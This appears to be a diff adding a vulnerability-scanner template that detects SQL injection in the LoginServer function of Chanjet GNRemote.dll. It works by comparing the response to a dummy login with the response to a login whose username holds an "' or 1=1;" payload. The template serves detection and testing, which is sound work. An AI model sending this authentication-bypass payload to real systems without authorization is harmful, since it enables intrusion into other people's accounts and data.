@@ -1,0 +1,37 @@
+id: chanjet-gnremote-login-sqli
+info:
+  name: Chanjet GNRemote.dll SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Detects a SQL injection vulnerability in Chanjet GNRemote.dll, specifically in the LoginServer function.
+
+http:
+  - raw:
+      - |
+        POST /GNRemote.dll?GNFunction=LoginServer&decorator=text_wrap&frombrowser=esl HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=xxxxx&password=xxxxxxx&ClientStatus=1
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '{"RetCode":2}'
+        part: body
+
+  - raw:
+      - |
+        POST /GNRemote.dll?GNFunction=LoginServer&decorator=text_wrap&frombrowser=esl HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username="' or 1=1;"&password=%018d8cbc8bfc24f018&ClientStatus=1
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '{"RetCode":0}'
+        part: body
